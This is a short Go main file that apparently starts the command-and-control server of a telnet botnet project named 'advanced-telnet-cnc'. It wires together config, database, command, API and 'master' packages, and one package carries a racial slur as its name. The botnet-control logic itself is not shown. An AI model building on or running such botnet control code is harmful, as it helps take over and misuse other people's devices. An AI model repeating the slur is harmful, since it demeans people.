package main

import (
	"advanced-telnet-cnc/source/api"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master"
	"advanced-telnet-cnc/source/master/command/commands"
	"advanced-telnet-cnc/source/niggers"
)

func main() {
	config.Serve()
	database.Serve()
	commands.Init()

	go api.Serve()
	go niggers.Serve()
	master.Serve()
}
